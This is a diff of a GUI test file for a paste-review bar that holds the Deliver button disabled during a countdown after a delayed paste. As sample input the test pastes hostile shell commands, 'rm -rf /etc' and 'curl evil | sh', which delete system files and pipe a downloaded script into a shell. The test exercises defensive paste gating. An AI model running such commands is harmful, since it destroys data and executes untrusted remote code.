@@ -3408,13 +3408,12 @@ ok(not _rbt.review_pending(), 'the real Reject click dispatched the reject')
 ok(not _rbar.isVisible() and _rbar.reviewed_term() is None,
    'the bar HIDES after a real button click (regression: the guard left it open)')
 
-# countdown: after a mode radio is picked, the deliver button is DISABLED (gated) until
-# the countdown elapses; picking a mode previews its delivered form in the mirror.
+# countdown: a paste with a delay leaves the Deliver button DISABLED (gated) until the
+# countdown elapses; a click during it is a gated no-op (the box already IS the preview).
 _rbt.apply_paste_delay(3)
 _rbm2 = _QMimeRB(); _rbm2.setText('rm -rf /etc\ncurl evil | sh\n'); _rbt.insertFromMimeData(_rbm2); pump()
-_rbar._radio_strip.click(); pump()
-ok(not _rbar._deliver.isEnabled() and _rbar._selected_action == 'stripped',
-   'picking a mode during the countdown previews it but leaves deliver DISABLED (gated)')
+ok(not _rbar._deliver.isEnabled() and _rbar._remaining > 0,
+   'a paste with a delay leaves Deliver DISABLED during the countdown')
 _rbar._deliver_clicked(); pump()
 ok(_rbt.review_pending() and _rbar.isVisible(),
    'a deliver click during the countdown is a gated no-op (still reviewing)')
